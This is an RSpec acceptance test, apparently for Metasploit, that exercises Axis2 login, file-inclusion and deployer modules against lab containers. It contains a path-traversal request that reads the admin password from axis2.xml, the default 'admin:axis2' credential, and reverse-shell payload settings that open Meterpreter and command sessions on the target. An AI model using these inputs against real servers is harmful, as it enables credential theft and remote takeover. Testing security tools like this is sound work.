require 'acceptance_spec_helper'
require 'nokogiri'

RSpec.describe 'Axis2 module targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  { 'axis141' => '1.4.1', 'axis162' => '1.6.2' }.each do |service, version|
    context "Axis2 #{version}" do
      before do
        native_version = target_exec(service, 'curl', '--fail', '--silent', 'http://127.0.0.1:8080/axis2/services/Version/getVersion')
        expect(native_version).to include("version is #{version}")
        expect(native_login(service, 'axis2')).to include('Welcome to Axis2 Web Admin Module')
        expect(native_login(service, 'wrong-password')).to include('Invalid auth credentials!')
      end

      it 'finds one valid administration credential' do
        output = run_target_module('auxiliary/scanner/http/axis_login', service, login_options('axis2'))
        expect(output).to include("Success: 'admin:axis2'")
      end

      it 'rejects one invalid administration credential' do
        output = run_target_module('auxiliary/scanner/http/axis_login', service, login_options('wrong-password'), allow_errors: true)
        expect(output).to include("Failed: 'admin:wrong-password'")
        expect(output).not_to include('Success:')
      end

      if version == '1.4.1'
        it 'reads the actual configuration credentials through the vulnerable service' do
          native = target_exec(service, 'curl', '--fail', '--silent', 'http://127.0.0.1:8080/axis2/services/Version?xsd=../conf/axis2.xml')
          expect(native).to include('<axisconfig', '<parameter name="userName">admin</parameter>', '<parameter name="password">axis2</parameter>')
          output = run_target_module('auxiliary/scanner/http/axis_local_file_include', service, { 'HttpTrace' => true })
          expect(output).to include('GET /axis2/services/Version?xsd=../conf/axis2.xml HTTP/1.1')
          expect(output).to include("Credentials Found Username: 'admin' - Password: 'axis2'")
        end
      else
        it 'does not report credentials when the same traversal is rejected' do
          # curl owns this placeholder syntax, rather than Ruby's formatter.
          status = target_exec(service, 'curl', '--silent', '--output', '/dev/null', '--write-out', '%{http_code}', 'http://127.0.0.1:8080/axis2/services/Version?xsd=../conf/axis2.xml') # rubocop:disable Style/FormatStringToken
          expect(status).to eq('404')
          output = run_target_module('auxiliary/scanner/http/axis_local_file_include', service, { 'HttpTrace' => true }, allow_errors: true)
          expect(output).to include('GET /axis2/services/Version?xsd=../conf/axis2.xml HTTP/1.1', 'Unrecognized 404 response')
          expect(output).not_to include('Credentials Found')
        end
      end

      it 'rejects deployment credentials without uploading an archive' do
        initial_files = service_files(service)
        output = run_target_module('exploit/multi/http/axis2_deployer', service, {
          'USERNAME' => 'admin', 'PASSWORD' => 'wrong-password', 'PATH' => '/axis2', 'TARGET' => 0,
          'PAYLOAD' => 'java/meterpreter/reverse_tcp', 'DisablePayloadHandler' => true,
          'AllowNoCleanup' => true, 'WfsDelay' => 0
        }, allow_errors: true)
        expect(output).to include("failed to login as 'admin'")
        expect(output).not_to include('Successfully uploaded')
        expect(service_files(service)).to eq(initial_files)
      end

      %w[java/meterpreter/reverse_tcp java/shell/reverse_tcp].each do |payload|
        it "opens #{payload} sessions twice and removes each service archive" do
          initial_files = service_files(service)
          initial_services = service_paths(service)
          expect(initial_services).to eq(['/axis2/services/Version'])
          2.times do
            proof_path = '/tmp/module-target-axis2-proof'
            target_exec(service, 'test', '!', '-e', proof_path)
            output = run_target_module('exploit/multi/http/axis2_deployer', service, {
              'USERNAME' => 'admin', 'PASSWORD' => 'axis2', 'PATH' => '/axis2', 'TARGET' => 0,
              'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444,
              'Spawn' => 2, 'WfsDelay' => 10, 'DisablePayloadHandler' => false
            }, action: 'run -z')
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            command = payload.include?('meterpreter') ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
            flag = payload.include?('meterpreter') ? '-C' : '-c'
            proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(20, 0.1) do
              native = target_exec(service, 'sh', '-c', "if test -f #{proof_path}; then echo axis2-proof; fi")
              expect(native.strip).to eq('axis2-proof')
            end
            console_command('sessions -K')
            target_exec(service, 'rm', '-f', proof_path)
            expect(service_files(service)).to eq(initial_files)
            # Axis2 notices deleted archives asynchronously. Wait for its real
            # service registry too, so a later LFI case cannot select a stale app.
            wait_for_expect(30, 0.2) do
              expect(service_paths(service)).to eq(initial_services)
            end
          end
        end
      end
    end
  end

  def native_login(service, password)
    target_exec(service, 'curl', '--fail', '--silent', '--data', "userName=admin&password=#{password}&submit=+Login+", 'http://127.0.0.1:8080/axis2/axis2-admin/login')
  end

  def service_files(service)
    target_exec(service, 'find', '/usr/local/tomcat/webapps/axis2/WEB-INF/services', '-mindepth', '1', '-printf', '%P\n').lines.sort
  end

  def service_paths(service)
    body = target_exec(service, 'curl', '--fail', '--silent', 'http://127.0.0.1:8080/axis2/services/listServices')
    Nokogiri::HTML(body).css('h2 a[href]').map { |link| URI.parse(link['href']).path }.sort
  end

  def login_options(password)
    {
      'USERNAME' => 'admin', 'PASSWORD' => password, 'TARGETURI' => '/axis2/axis2-admin/login',
      'USERPASS_FILE' => nil, 'USER_FILE' => nil, 'PASS_FILE' => nil,
      'BLANK_PASSWORDS' => false, 'USER_AS_PASS' => false, 'STOP_ON_SUCCESS' => true
    }
  end
end
